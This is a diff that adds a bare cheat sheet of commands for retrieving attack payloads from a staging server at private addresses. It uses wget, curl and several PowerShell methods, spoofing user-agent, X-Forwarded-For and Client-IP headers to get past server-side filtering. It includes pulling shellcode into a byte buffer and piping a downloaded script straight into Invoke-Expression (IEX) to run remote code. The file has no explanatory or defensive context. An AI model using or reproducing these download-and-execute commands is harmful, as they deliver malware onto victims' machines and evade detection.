@@ -1,0 +1,45 @@
+# HTTP retrieval via Wget
+wget -qO- http://127.0.0.1/payload.php
+
+# HTTP retrieval via curl
+curl http://127.0.0.1/payload.php 
+
+# Spoofed header via Wget
+wget -qO- --header="X-Forwarded-For: 192.168.0.26" http://127.0.0.1/payload.php
+
+# Spoofed header via curl
+curl -H "X-Forwarded-For: 192.168.0.26"  http://127.0.0.1/payload.php
+
+# Spoofed user-agent via Invoke-WebRequest 
+(Invoke-WebRequest http://192.168.0.21/payload.php -UserAgent 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.00').Content
+
+# Spoofed Client-IP Header vis Invoke-WebRequest
+(Invoke-WebRequest http://192.168.0.21/payload.php?session -Headers @{'Client-IP' = '192.168.0.29'}).Content
+
+# Spoofed user-agent via System.Net.WebClient
+$WC = New-Object System.Net.WebClient
+$WC.Headers.Add('user-agent','Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0')
+$WC.DownloadString('http://192.168.0.21/payload.php')
+
+# Spoofed user-agent via System.Net.WebRequest
+$WC = [system.Net.WebRequest]::Create('http://192.168.0.21/payload.php')
+$WC.UserAgent = 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.00'
+$Response = $WC.GetResponse()
+$Stream = $Response.GetResponseStream()
+$SR = New-Object System.IO.StreamReader($Stream)
+$SR.ReadToEnd()
+
+# Listener retrieval via Invoke-WebRequest
+$HTTP = (Invoke-WebRequest http://192.168.0.21/payload.php?session -Headers @{'Client-IP' = '192.168.0.29'} -UserAgent 'Mozilla/5.0 (X11; Linux x86_64; rv:102.00) Gecko/20100101 Firefox/102.00').Content
+$HTTP.split(',')[0], $HTTP.split(',')[1]
+
+# Shellcode retrieval via System.Net.WebRequest
+$WC = [system.Net.WebRequest]::Create('http://192.168.0.21/payload.php')
+$WC.UserAgent = 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.00'
+$Response = $WC.GetResponse()
+$Stream = $Response.GetResponseStream()
+$SR = New-Object System.IO.StreamReader($Stream)
+[Byte[]]$buf = $SR.ReadToEnd() -split ','
+
+# Script retrieval via Invoke-WebRequest
+$((Invoke-WebRequest http://192.168.0.21/payload.php?session -UserAgent 'Mozilla/5.0 (X11; Linux x86_64; rv:102.01) Gecko/20100101 Firefox/102.01' -Headers @{'X-Forwarded-For' = '192.168.0.29'}).Content) | IEX
